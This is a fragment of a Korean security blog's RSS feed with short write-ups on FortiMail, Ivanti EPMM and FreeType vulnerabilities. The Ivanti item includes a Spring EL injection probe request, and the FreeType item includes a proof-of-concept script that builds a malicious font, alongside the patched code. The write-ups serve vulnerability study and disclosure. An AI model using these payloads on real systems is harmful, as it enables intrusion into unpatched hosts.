class="hljs-keyword">long</span> output_buffer [<span class="hljs-number">2</span>];out_00 = (uchar *)<span class="hljs-built_in">malloc</span>(__size);iVar2 = __isoc99_sscanf(param_1,<span class="hljs-string">&quot;Era=%1d&amp;Payload=%m[^&amp;]&amp;AuthHash=%m[^&amp;]&amp;&quot;</span>,&amp;Era,&amp;Payload, &amp;AuthHash);input_size = <span class="hljs-built_in">strlen</span>((<span class="hljs-keyword">char</span> *)AuthHash);__size = <span class="hljs-built_in">strlen</span>((<span class="hljs-keyword">char</span> *)Payload);input_size = <span class="hljs-built_in">strlen</span>((<span class="hljs-keyword">char</span> *)AuthHash);<span class="hljs-keyword">if</span> (input_size &lt; <span class="hljs-number">0x1e</span>) {iVar3 = EVP_DecodeUpdate(ctx,(uchar *)output_buffer,&amp;output_size,AuthHash,(<span class="hljs-keyword">int</span>)input_size);iVar2 = EVP_DecodeUpdate(ctx,out_00,&amp;local_94,Payload,iVar2);</code></pre></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://fortiguard.fortinet.com/psirt/FG-IR-25-254">Stack-based buffer overflow vulnerability in API</a></li><li><a href="https://github.com/kn0x0x/CVE-2025-32756-POC">CVE-2025-32756-POC</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/FortiMail/">FortiMail</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-32756/">CVE-2025-32756</category>
      
      <category domain="https://hackyboiz.github.io/tags/unauthenticated/">unauthenticated</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/Fortinet/">Fortinet</category>
      
      <category domain="https://hackyboiz.github.io/tags/FortiCamera/">FortiCamera</category>
      
      <category domain="https://hackyboiz.github.io/tags/FortiNDR/">FortiNDR</category>
      
      <category domain="https://hackyboiz.github.io/tags/FortiRecorder/">FortiRecorder</category>
      
      <category domain="https://hackyboiz.github.io/tags/FortiVoice/">FortiVoice</category>
      
      <category domain="https://hackyboiz.github.io/tags/stack-buffer-overflow/">stack buffer overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/base64/">base64</category>
      
      <category domain="https://hackyboiz.github.io/tags/api/">api</category>
      
      
      <comments>https://hackyboiz.github.io/2025/06/11/j0ker/2025-06-11/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-4428 : Ivanti EPPM 에서 발생한 Spring EL Injection 취약점</title>
      <link>https://hackyboiz.github.io/2025/06/07/mungsul/2025-06-07/</link>
      <guid>https://hackyboiz.github.io/2025/06/07/mungsul/2025-06-07/</guid>
      <pubDate>Sat, 07 Jun 2025 05:30:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://labs.watchtowr.com/expression-payloads-meet-mayhe</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.watchtowr.com/expression-payloads-meet-mayhem-cve-2025-4427-and-cve-2025-4428/">https://labs.watchtowr.com/expression-payloads-meet-mayhem-cve-2025-4427-and-cve-2025-4428/</a></p><p><a href="https://projectdiscovery.io/blog/ivanti-remote-code-execution">https://projectdiscovery.io/blog/ivanti-remote-code-execution</a></p><p><a href="https://www.wiz.io/blog/ivanti-epmm-rce-vulnerability-chain-cve-2025-4427-cve-2025-4428">https://www.wiz.io/blog/ivanti-epmm-rce-vulnerability-chain-cve-2025-4427-cve-2025-4428</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ivanti Endpoint Manager Mobile<ul><li>11.12.0.4 &#xC774;&#xD558;</li><li>12.3.0.1 &#xC774;&#xD558;</li><li>12.4.0.1 &#xC774;&#xD558;</li><li>12.5.0.0 &#xC774;&#xD558;</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Ivanti EPPM &#xC5D0;&#xC11C; Spring EL Injection &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; ITW &#xC5D0;&#xC11C; &#xD65C;&#xBC1C;&#xD558;&#xAC8C; Exploit &#xB418;&#xB358; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. </p><p><code>/mifs/admin/rest/api/v2/featureusage</code> &#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB358; format &#xD30C;&#xB77C;&#xBA54;&#xD130;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xC5EC; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xBA74; Spring EL Injection &#xB97C; &#xC77C;&#xC73C;&#xD0AC; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java">GET /mifs/admin/rest/api/v2/featureusage?format=${<span class="hljs-number">7</span>*<span class="hljs-number">7</span>} HTTP/<span class="hljs-number">1.1</span>Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">111.148</span>Cookie: ...</code></pre><p> <code>/api/v2/featureusage</code> &#xB97C; &#xB77C;&#xC6B0;&#xD305;&#xD558;&#xB294; &#xCEE8;&#xD2B8;&#xB864;&#xB7EC;&#xC5D0;&#xC11C; <code>downloadDeviceFeatureUsageReport</code> &#xBA54;&#xC11C;&#xB4DC;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;  <code>@Valid</code> &#xC5B4;&#xB178;&#xD14C;&#xC774;&#xC158;&#xC73C;&#xB85C; <code>DeviceFeatureUsageReportQueryRequest</code> &#xB97C; <code>ConstraintValidator</code> &#xB97C; &#xD1B5;&#xD574; &#xC785;&#xB825;&#xAC12; &#xAC80;&#xC99D;&#xC744; &#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java"><span class="hljs-meta">@PreAuthorize(&quot;hasPermissionForSpace(#adminDeviceSpaceId, {&apos;PERM_FEATURE_USAGE_DATA_VIEW&apos;})&quot;)</span><span class="hljs-meta">@RequestMapping(method = {RequestMethod.GET}, value = {&quot;/api/v2/featureusage&quot;})</span><span class="hljs-meta">@ResponseBody</span><span class="hljs-meta">@ApiOperation(value = &quot;Download Device Feature Usage Report&quot;, notes = &quot;Download Device Feature Usage Report&quot;, tags = {&quot;DeviceFeatureUsage: All device feature usage related API&quot;})</span><span class="hljs-meta">@ApiResponses({@ApiResponse(code = 500, message = &quot;Internal Server Error&quot;)})</span><span class="hljs-meta">@PublicApi</span><span class="hljs-function"><span class="hljs-keyword">public</span> Response <span class="hljs-title">downloadDeviceFeatureUsageReport</span><span class="hljs-params">(<span class="hljs-meta">@Valid</span> <span class="hljs-meta">@ModelAttribute</span> DeviceFeatureUsageReportQueryRequest queryRequest, <span class="hljs-meta">@RequestParam(defaultValue = &quot;0&quot;)</span> <span class="hljs-keyword">int</span> adminDeviceSpaceId, <span class="hljs-meta">@ApiIgnore</span> Locale locale, <span class="hljs-meta">@ApiIgnore</span> HttpServletResponse httpServletResponse)</span> <span class="hljs-keyword">throws</span> IOException </span>{  Response response = setResponseSuccess(httpServletResponse, locale);  <span class="hljs-keyword">try</span> {    <span class="hljs-keyword">this</span>.deviceFeatureUsageReportService.downloadDeviceFeatureUsageReport(getCurrentUserName(), queryRequest, httpServletResponse);  } <span class="hljs-keyword">catch</span> (ResultNotFoundException e) {    MessageKeys messageKeys; httpServletResponse.setStatus(HttpStatus.NOT_FOUND.value());    <span class="hljs-keyword">if</span> (StringUtils.isNotBlank(queryRequest.getDatafile())) {      messageKeys = MessageKeys.DEVICE_FEATURE_USAGE_DATAFILE_NOT_FOUND;    } <span class="hljs-keyword">else</span> {      messageKeys = MessageKeys.DEVICE_FEATURE_USAGE_NOT_FOUND;    }    setErrorResponse((MessageCode)messageKeys, locale, HttpStatus.NOT_FOUND, response, httpServletResponse);  }  <span class="hljs-keyword">return</span> response;}</code></pre><p><code>DeviceFeatureUsageReportQueryRequest</code>  &#xC5D0;&#xC11C; format &#xC774;&#xB77C;&#xB294; &#xBCC0;&#xC218;&#xAC00; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. [1]</p><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DeviceFeatureUsageReportQueryRequest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">QueryRequestWithPagination</span> </span>{  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SortOrder DEFAULT_SORT_ORDER = SortOrder.DESC;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String DEFAULT_SORT_COLUMN_NAME = <span class="hljs-string">&quot;job_fired_at&quot;</span>;  <span class="hljs-keyword">private</span> String format = <span class="hljs-string">&quot;json&quot;</span>;    <span class="hljs-keyword">private</span> String datafile;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">DeviceFeatureUsageReportQueryRequest</span><span class="hljs-params">()</span> </span>{    <span class="hljs-keyword">this</span>.sortOrder = SortOrder.DESC;  }    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getFormat</span><span class="hljs-params">()</span> </span>{ <span class="hljs-comment">// [1]</span>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.format;  }  <span class="hljs-comment">//...</span>}</code></pre><p><code>@Valid</code> &#xC5B4;&#xB178;&#xD14C;&#xC774;&#xC158;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74;  <code>DeviceFeatureUsageReportQueryRequestValidator</code>  &#xC5D0; &#xAD6C;&#xD604;&#xB41C;<code>ConstraintValidator</code> &#xC758; <code>isValid</code> &#xAC00; &#xD638;&#xCD9C;&#xB418;&#xC5B4; &#xC785;&#xB825;&#xAC12; &#xAC80;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74; format &#xC774; json &#xC774;&#xB098; csv &#xAC00; &#xC544;&#xB2C8;&#xBA74; &#xC5D0;&#xB7EC;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB3C4;&#xB85D; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. [1] &#xC5D0;&#xC11C; format &#xAC12;&#xC744; &#xBC1B;&#xACE0; [2] &#xC5D0;&#xC11C; &#xBE44;&#xAD50;&#xD558;&#xBA70; [3] &#xC5D0;&#xC11C; formatMessage &#xAC00; &#xC5D0;&#xB7EC;&#xBA54;&#xC2DC;&#xC9C0;&#xC5D0; &#xB9E4;&#xD551;&#xB418;&#xC8E0;.</p><pre><code class="hljs java">implements ConstraintValidator&lt;ValidDeviceFeatureUsageReportQueryRequest, DeviceFeatureUsageReportQueryRequest&gt;{    <span class="hljs-meta">@Autowired</span>  <span class="hljs-keyword">private</span> LocalizedMessageBuilder localizedMessageBuilder;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">initialize</span><span class="hljs-params">(ValidDeviceFeatureUsageReportQueryRequest constraintAnnotation)</span> </span>{}    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isValid</span><span class="hljs-params">(DeviceFeatureUsageReportQueryRequest value, ConstraintValidatorContext context)</span> </span>{    String format = value.getFormat(); <span class="hljs-comment">// [1]</span>    <span class="hljs-keyword">if</span> (format == <span class="hljs-keyword">null</span>) {      <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;    }        <span class="hljs-keyword">boolean</span> isValid = (format.equalsIgnoreCase(<span class="hljs-string">&quot;json&quot;</span>) || format.equalsIgnoreCase(<span class="hljs-string">&quot;csv&quot;</span>)); <span class="hljs-comment">// [2]</span>    <span class="hljs-keyword">if</span> (!isValid) {      String formatMessage = <span class="hljs-keyword">this</span>.localizedMessageBuilder.getLocalizedMessage((MessageCode)MessageKeys.DEVICE_FEATURE_USAGE_INVALID_FORMAT, <span class="hljs-keyword">new</span> Object[] { format }); <span class="hljs-comment">// [3]</span>            context.disableDefaultConstraintViolation();      context.buildConstraintViolationWithTemplate(formatMessage).addConstraintViolation(); <span class="hljs-comment">// [4]</span>    }         <span class="hljs-keyword">return</span> isValid;  }}</code></pre><p>&#xC5D0;&#xB7EC;&#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70; {0} &#xBD80;&#xBD84;&#xC5D0; &#xC720;&#xC800; &#xC785;&#xB825;&#xAC12;&#xC774; &#xB4E4;&#xC5B4;&#xAC00;&#xC11C; &#xD3EC;&#xB9F7;&#xD305;&#xC774; &#xB418;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java"><span class="hljs-meta">@Localize(</span><span class="hljs-meta">      value = &quot;Format &apos;&apos;{0}&apos;&apos; is invalid. Valid formats are &apos;&apos;json&apos;&apos;, &apos;&apos;csv&apos;&apos;.&quot;,</span><span class="hljs-meta">      key = &quot;com.mobileiron.vsp.messages.device.feature.usage.report.invalid.format&quot;</span><span class="hljs-meta">   )</span></code></pre><p>&#xADF8;&#xB9AC;&#xACE0; [4] <code>context.buildConstraintViolationWithTemplate(formatMessage)</code> &#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA70; &#xD574;&#xB2F9; &#xD3EC;&#xB9F7;&#xC774; &#xD15C;&#xD50C;&#xB9BF;&#xD654; &#xB429;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xBD80;&#xBD84; &#xB54C;&#xBB38;&#xC5D0; SSTI &#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://labs.watchtowr.com/expression-payloads-meet-mayhem-cve-2025-4427-and-cve-2025-4428/">https://labs.watchtowr.com/expression-payloads-meet-mayhem-cve-2025-4427-and-cve-2025-4428/</a></p><p><a href="https://projectdiscovery.io/blog/ivanti-remote-code-execution">https://projectdiscovery.io/blog/ivanti-remote-code-execution</a></p><p><a href="https://www.wiz.io/blog/ivanti-epmm-rce-vulnerability-chain-cve-2025-4427-cve-2025-4428">https://www.wiz.io/blog/ivanti-epmm-rce-vulnerability-chain-cve-2025-4427-cve-2025-4428</a></p><p><a href="https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/#">https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/#</a></p><p><a href="https://www.hahwul.com/blog/2018/spel-injection-springboot-rce/">https://www.hahwul.com/blog/2018/spel-injection-springboot-rce/</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/SSTI/">SSTI</category>
      
      <category domain="https://hackyboiz.github.io/tags/Ivanti/">Ivanti</category>
      
      <category domain="https://hackyboiz.github.io/tags/mungsul/">mungsul</category>
      
      <category domain="https://hackyboiz.github.io/tags/Ivanti-Endpoint-Manager-Mobile/">Ivanti Endpoint Manager Mobile</category>
      
      <category domain="https://hackyboiz.github.io/tags/Spring-EL-Injection/">Spring EL Injection</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-4428/">CVE-2025-4428</category>
      
      
      <comments>https://hackyboiz.github.io/2025/06/07/mungsul/2025-06-07/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-27363: FreeType의 Out-of-Bounds Write 취약점</title>
      <link>https://hackyboiz.github.io/2025/06/04/romi0x/1day1line0604/</link>
      <guid>https://hackyboiz.github.io/2025/06/04/romi0x/1day1line0604/</guid>
      <pubDate>Wed, 04 Jun 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2025-27363&quot;&gt;https://</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27363">https://nvd.nist.gov/vuln/detail/CVE-2025-27363</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>FreeType &#xBC84;&#xC804; 2.13.0 &#xC774;&#xD558;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>FreeType&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xC640; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xD3F0;&#xD2B8; &#xB80C;&#xB354;&#xB9C1; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC785;&#xB2C8;&#xB2E4;. TrueType, OpenType, CFF &#xB4F1; &#xC5EC;&#xB7EC; &#xD3EC;&#xB9F7;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xBA70;, Android, Linux &#xB370;&#xC2A4;&#xD06C;&#xD0D1;, &#xAC8C;&#xC784; &#xC5D4;&#xC9C4; &#xB4F1;&#xC5D0;&#xC11C;&#xB3C4; &#xB110;&#xB9AC; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>CVE-2025-27363&#xC740; TrueType GX &#xBC0F; variable font &#xCC98;&#xB9AC; &#xC911; &#xBC1C;&#xC0DD;&#xD558;&#xB294; <strong>Out-of-Bounds Write</strong> &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; FreeType&#xC774; &#xD3F0;&#xD2B8; &#xB0B4;&#xBD80;&#xC758; &#xC11C;&#xBE0C; &#xAE00;&#xB9AC;&#xD504;(subglyph, &#xAE00;&#xB9AC;&#xD504;&#xB97C; &#xC774;&#xB8E8;&#xB294; &#xC791;&#xC740; &#xC870;&#xAC01;)&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xD3F0;&#xD2B8;&#xC5D0;&#xB294; <code>%</code>, <code>&amp;</code>, <code>@</code> &#xAC19;&#xC740; &#xAE00;&#xC790;&#xAC00; &#xB2E8;&#xC77C; &#xB3C4;&#xD615;&#xC774; &#xC544;&#xB2C8;&#xB77C; &#xC5EC;&#xB7EC; &#xC791;&#xC740; &#xB3C4;&#xD615;&#xB4E4;&#xB85C; &#xC870;&#xB9BD;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xAC01;&#xAC01;&#xC758; &#xC870;&#xAC01;&#xB4E4;&#xC744; subglyph&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; FreeType&#xC758; <code>load_truetype_glyph()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xAE00;&#xB9AC;&#xD504;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; &#xAD6C;&#xC131; &#xC694;&#xC18C; &#xC218;&#xB97C; &#xACC4;&#xC0B0;&#xD560; &#xB54C; &#xC815;&#xC218; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC5EC;, &#xC2E4;&#xC81C; &#xD544;&#xC694;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC;&#xBCF4;&#xB2E4; &#xC791;&#xAC8C; &#xD799; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xBA74;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xB9CE;&#xC740; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xB97C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC4F0;&#xB824;&#xACE0; &#xD560; &#xB54C; &#xD560;&#xB2F9;&#xB41C; &#xBC84;&#xD37C; &#xBC94;&#xC704;&#xB97C; &#xB118;&#xC5B4;&#xC11C;&#xB294; &#xD799; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCC38;&#xACE0;&#xD55C; <a href="https://github.com/zhuowei/CVE-2025-27363-proof-of-concept">PoC</a>&#xC5D0;&#xC11C;&#xB294; Google&#xC758; Roboto Flex &#xD3F0;&#xD2B8;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; <code>%</code> &#xAE00;&#xB9AC;&#xD504;&#xC5D0; 65,536&#xAC1C;&#xC758; &#xAD6C;&#xC131; &#xC694;&#xC18C; &#xAE00;&#xB9AC;&#xD504;&#xB97C; &#xC0BD;&#xC785;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs nix">from fontTools.ttLib <span class="hljs-built_in">import</span> TTFontfrom fontTools.ttLib.tables._g_l_y_f <span class="hljs-built_in">import</span> GlyphComponent, Glyph<span class="hljs-attr">font</span> = TTFont(<span class="hljs-string">&quot;RobotoFlex.ttf&quot;</span>)<span class="hljs-attr">glyph</span> = Glyph()glyph.<span class="hljs-attr">components</span> = []for _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>x10000):  <span class="hljs-comment"># 65,536&#xAC1C;&#xC758; &#xC11C;&#xBE0C;&#xAE00;&#xB9AC;&#xD504; &#xCD94;&#xAC00;</span>    <span class="hljs-attr">comp</span> = GlyphComponent()    comp.<span class="hljs-attr">glyphName</span> = <span class="hljs-string">&quot;space&quot;</span>    comp.<span class="hljs-attr">x</span> = <span class="hljs-number">0</span>    comp.<span class="hljs-attr">y</span> = <span class="hljs-number">0</span>    glyph.components.append(comp)font[<span class="hljs-string">&quot;glyf&quot;</span>].glyphs[<span class="hljs-string">&quot;percent&quot;</span>] = glyphfont.save(<span class="hljs-string">&quot;rf2.ttf&quot;</span>)</code></pre><p>&#xD328;&#xCE58;&#xB294; FreeType &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xC758; <code>ttgload.c</code> &#xD30C;&#xC77C; &#xB0B4; <code>load_truetype_glyph()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC73C;&#xBA70;, &#xC815;&#xC218; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xBC94;&#xC704; &#xCCB4;&#xD06C;&#xC640; &#xC548;&#xC804;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9; &#xB9E4;&#xD06C;&#xB85C;(<code>FT_QALLOC_MULT</code>)&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xC218;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p>&#xC218;&#xC815; &#xC804;</p>  <pre><code class="hljs lisp">n_subglyphs = num_subglyphs + <span class="hljs-number">4</span><span class="hljs-comment">;</span>loader-&gt;extra_points = (<span class="hljs-name">FT_Vector*</span>)ft_mem_alloc(<span class="hljs-name">n_subglyphs</span> * sizeof(FT_Vector));</code></pre><p><code>num_subglyphs + 4</code> &#xACC4;&#xC0B0; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC815;&#xC218; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA74; &#xAC12;&#xC774; &#xC791;&#xC740; &#xC218;&#xB85C; &#xC21C;&#xD658;(wrap-around)&#xB418;&#xC5B4;, &#xD799; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xC2E4;&#xC81C; &#xD544;&#xC694;&#xD55C; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xC801;&#xAC8C; &#xD560;&#xB2F9;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xC774;&#xD6C4;&#xC5D0; &#xB9CE;&#xC740; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xB97C; &#xAE30;&#xB85D;&#xD558;&#xB824; &#xD560; &#xB54C; &#xBC84;&#xD37C;&#xB97C; &#xB118;&#xB294; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>&#xC218;&#xC815; &#xD6C4;</p>  <pre><code class="hljs lisp">if ( <span class="hljs-name">num_subglyphs</span> &gt; SOME_MAX_LIMIT )  return FT_THROW( <span class="hljs-name">Invalid_Outline</span> )<span class="hljs-comment">;</span>n_subglyphs = num_subglyphs + <span class="hljs-number">4</span><span class="hljs-comment">;</span>if ( <span class="hljs-name">FT_QALLOC_MULT</span>( <span class="hljs-name">loader-&gt;extra_points</span>, n_subglyphs, sizeof(<span class="hljs-name">FT_Vector</span>) ) )  return FT_THROW( <span class="hljs-name">Out_Of_Memory</span> )<span class="hljs-comment">;</span></code></pre><p>&#xB367;&#xC148; &#xC804;&#xC5D0; &#xBC94;&#xC704; &#xAC80;&#xC0AC;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xC5EC; &#xC815;&#xC218; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB97C; &#xC608;&#xBC29;&#xD558;&#xACE0;, <code>FT_QALLOC_MULT()</code> &#xB9E4;&#xD06C;&#xB85C;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC548;&#xC804;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC815;&#xC218; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;, &#xBA54;&#xBAA8;&#xB9AC; &#xACFC;&#xC18C;&#xD560;&#xB2F9;, Out-of-Bounds Write&#xB97C; &#xBC29;&#xC9C0;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://android.googlesource.com/platform/external/freetype/+/f9c146bda91f441b7bebac4387e46ae40caaf3b1">https://android.googlesource.com/platform/external/freetype/+/f9c146bda91f441b7bebac4387e46ae40caaf3b1</a></p><p><a href="https://github.com/zhuowei/CVE-2025-27363-proof-of-concept">https://github.com/zhuowei/CVE-2025-27363-proof-of-concept</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      <category domain="https://hackyboiz.github.io/tags/FreeType/">FreeType</category>
      
      <category domain="https://hackyboiz.github.io/tags/Out-of-Bounds-Write/">Out-of-Bounds Write</category>
      
      <category domain="https://hackyboiz.github.io/tags/Android/">Android</category>
      
      
      <comments>https://hackyboiz.github.io/2025/06/04/romi0x/1day1line0604/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] A spoonful of javascript for windbg</title>
      <link>https://hackyboiz.github.io/2025/06/01/pwndorei/windbg_js_en/</link>
      <guid>https://hackyboiz.github.io/2025/06/01/pwndorei/windbg_js_en/</guid>
      <pubDate>Sun, 01 Jun 2025 14:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Hello, this is &lt;strong&gt;pwndore</description>
        
      
      
      
